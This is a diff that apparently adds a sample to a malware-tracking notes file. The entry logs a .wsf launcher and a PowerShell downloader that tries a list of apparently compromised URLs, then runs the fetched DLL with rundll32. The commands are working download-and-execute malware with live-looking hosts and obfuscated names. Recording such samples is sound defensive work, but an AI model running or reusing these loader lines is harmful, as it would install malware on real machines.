@@ -14,6 +14,10 @@ WScript.exe C:\Users\Admin\AppData\Local\Temp\Activity-April(3034).wsf
 
 powershell.exe -ENC Start-Sleep -Seconds 2;$imbricate = ("https://pathways4success.com/ZsF1aj9/3bNwkEkPRZ9,https://pryhmshift.com/Ow2/mY76PA5I2ypd,https://centraltrucks.com.br/jexc/KaJ3fB,https://tomazellapresentes.com.br/ZeUvz7b/aHzRH,https://temeculatireshop.com/1uwog/AyWENocy,https://plantationlandscapingandirrigation.com/7EwmGoE/1n7mGHSy,https://brevardbusinessguide.com/P4m9JdF/6FqnH3k43,https://ladulceriacandiesnmorellc.com/bv2Zr0t/9jyXuSQzddN4,https://heraldoturismo.com.br/on3t7A/fvCpWlKG").split(",");foreach ($WardmanWoundily in $imbricate) {try {wget $WardmanWoundily -TimeoutSec 19 -O $env:TEMP\PrenegotiatedHorsekeeper.misdemeanorRibosomes;if ((Get-Item $env:TEMP\PrenegotiatedHorsekeeper.misdemeanorRibosomes).length -ge 100000) {start rundll32 $env:TEMP\\PrenegotiatedHorsekeeper.misdemeanorRibosomes,X555;break;}}catch {Start-Sleep -Seconds 2;}}
 
+WScript.exe C:\Users\Admin\AppData\Local\Temp\Rldekw.wsf
+
+Start-Sleep -Seconds 4;$rechangesNavigators = ("http://milleniuninformatica.com.br/Le9/nLHrL0i,https://t-lows.com/ggAJ2m/VlyWZg,https://medano355condominio.com/Tt7l/gkmKosM5,https://antoinettegabriel.com/YuUE/tYEdjqT0WC,https://farmfutures.in/tlUtBc/IyVX8ptn,https://stealingexcellence.com/rVR9r/Hal5sirvckcT,https://qassimnews.com/yweNej/3YXgYf,https://choicefaz.com.br/w1W2/JtIYt,https://seicas.com/KvtM0/r7jNjc8EtweM,https://alzheimersdigest.net/ZKpva/PlQU9").split(",");foreach ($DreglessPotboydom in $rechangesNavigators) {try {wget $DreglessPotboydom -TimeoutSec 19 -O $env:TEMP\chitinocalcareousAnchorets.DichlorodifluoromethaneDriblet;if ((Get-Item $env:TEMP\chitinocalcareousAnchorets.DichlorodifluoromethaneDriblet).length -ge 100000) {start rundll32 $env:TEMP\\chitinocalcareousAnchorets.DichlorodifluoromethaneDriblet,X555;break;}}catch {Start-Sleep -Seconds 4;}}
+
 *************************************************
 
 .dll distro
